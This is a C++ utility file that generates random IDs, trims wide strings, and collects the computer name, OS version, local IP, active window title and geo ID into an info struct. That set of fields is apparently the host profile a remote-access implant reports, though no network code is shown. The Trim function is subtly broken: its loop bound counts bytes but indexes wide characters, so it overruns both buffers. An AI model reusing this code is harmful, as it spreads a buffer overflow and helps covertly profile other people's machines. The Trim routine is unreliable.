//
// Created by LUNAFE on 2022-02-04.
//

#include "util.h"

void util::GenId(char *buf, int len) {
    static const char kAlphaNum[] =
            "0123456789"
            "ABCDEFGHIJKLMNOPQRSTUVWXYZ"
            "abcdefghijklmnopqrstuvwxyz";
    srand((unsigned) time(NULL));
    for (int i = 0; i < len - 1; ++i) {
        buf[i] = kAlphaNum[rand() % (sizeof(kAlphaNum) - 1)];
    }
    buf[len - 1] = 0;
}

void util::Trim(wchar_t *src, int index, wchar_t *dst) {
    for (int i = 0; i < (wcslen(src) * 2) - (index * 2); i++) {
        dst[i] = src[i + (index)];
    }
}

void util::InitRetrieveInfo(struct INFO *info) {
#ifdef DEBUG
    wprintf(L"[DEBUG] InitRetrieveInfo\n");
#endif
    wchar_t computer_name[32];
    event_handler::GetComputerName(computer_name);
    wcscpy(info->computer_name, computer_name);


    wchar_t os_version[16];
    event_handler::GetOsVersion(os_version);
    wcscpy(info->os_version, os_version);

    wchar_t local_ip[16];
    event_handler::GetIp(local_ip);
    wcscpy(info->ip_address, local_ip);

    wchar_t active_window[256];
    event_handler::GetActiveWindow(active_window);
    wcscpy(info->window_title, active_window);

    wchar_t geo_id[8];
    event_handler::GetGeoId(geo_id);
    wcscpy(info->geo_id, geo_id);
}
